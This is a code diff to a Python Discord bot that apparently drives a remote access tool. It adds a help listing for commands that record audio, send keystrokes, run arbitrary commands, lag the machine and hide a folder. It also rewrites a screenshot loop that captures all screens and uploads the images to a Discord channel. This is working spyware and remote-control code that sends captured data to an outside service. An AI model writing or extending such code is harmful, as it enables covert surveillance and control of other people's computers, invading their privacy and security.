@@ -1,3 +1,4 @@
+from email.mime import message
 import os
 import discord
 import asyncio
@@ -82,6 +83,33 @@ class MyClient(discord.Client):
                         return
                     await message.channel.send(f'Selected client set to {selectedClient}')
                     return
+                
+                if message.content == 'help':
+                    help_message = (
+                        "PLEASE RUN client list to select a client\n"
+                        "you cannot use the program without selecting a client\n"
+                        "Available commands:\n"
+                        "rec - Record audio\n"
+                        "upd - Update the application\n"
+                        "scr - Take a screenshot\n"
+                        "tts - Text-to-speech\n"
+                        "msg - Display a message box\n"
+                        "lock - Lock the screen\n"
+                        "key - Send keystrokes\n"
+                        "close - Close a process\n"
+                        "img - Display an image\n"
+                        "vid - Display a video\n"
+                        "sound - Play a sound\n"
+                        "vol - Set the volume\n"
+                        "min - Minimize all windows\n"
+                        "lag - Lag computer(CPU and RAM)\n"
+                        "cmd - Run a command\n"
+                        "cmdtoggle - Toggle command mode\n"
+                        "hide - Hide the announcer folder\n"
+                        "unhide - Unhide the announcer folder\n"
+                        "help - Show this help message\n"
+                    )
+                    await message.channel.send(help_message)
                 
                 if not selectedClient == clientName:
                     return
@@ -173,25 +201,24 @@ class MyClient(discord.Client):
                     await self.change_presence(activity=discord.Game(name="Updating..."))
 
                 # scr - Take a screenshot
-                if startswith := message.content.startswith('scr'):
-                    
-                    
-                    msg = await self.wait_for('message', check=check)
-                    if not msg.content[4:].strip().isdigit():
-                        await message.channel.send('Please enter a valid number')
-                        return
-                    amount = int(msg.content.strip()[4:].strip())
-                    #send a error message if amount is not a number
-                    
-                    for i in range(amount):
-                        if self.cancelled:
-                            await message.channel.send('Screenshot operation cancelled.')
-                            break
-                        im = ImageGrab.grab(all_screens=True)
-                        im.save('screenshot.png')
-                        await message.channel.send(file=discord.File('screenshot.png'))
-                        os.remove('screenshot.png')
-                        await asyncio.sleep(1)
+                if message.content.startswith('scr'):
+                    print('Taking screenshot(s)')
+                    parts = message.content.strip().split()
+                    if len(parts) == 2 and parts[1].isdigit():
+                        amount = int(parts[1])
+                        print(f'Taking {amount} screenshot(s)')
+                        for i in range(amount):
+                            if self.cancelled:
+                                await message.channel.send('Screenshot operation cancelled.')
+                                break
+                            im = ImageGrab.grab(all_screens=True)
+                            im.save('screenshot.png')
+                            await message.channel.send(file=discord.File('screenshot.png'))
+                            os.remove('screenshot.png')
+                            await asyncio.sleep(1)
+                        print('Screenshots taken')
+                    else:
+                        await message.channel.send('Incorrect syntax! Usage: scr <number>')
 
                 # tts - Text-to-speech
                 if message.content == 'tts':
@@ -379,29 +406,7 @@ class MyClient(discord.Client):
                     await message.channel.send(f'Volume set to {msg.content}%')
 
                 # help - Display help message
-                if message.content == 'help':
-                    help_message = (
-                        "Available commands:\n"
-                        "rec - Record audio\n"
-                        "upd - Update the application\n"
-                        "scr - Take a screenshot\n"
-                        "tts - Text-to-speech\n"
-                        "msg - Display a message box\n"
-                        "lock - Lock the screen\n"
-                        "key - Send keystrokes\n"
-                        "close - Close a process\n"
-                        "img - Display an image\n"
-                        "vid - Display a video\n"
-                        "sound - Play a sound\n"
-                        "vol - Set the volume\n"
-                        "min - Minimize all windows\n"
-                        "scrvid - Record a video of the screen\n"
-                        "cmd - Run a command\n"
-                        "hide - Hide the announcer folder\n"
-                        "unhide - Unhide the announcer folder\n"
-                        "help - Show this help message\n"
-                    )
-                    await message.channel.send(help_message)
+                
 
                 # min - Press Win+D
                 if message.content == 'min':
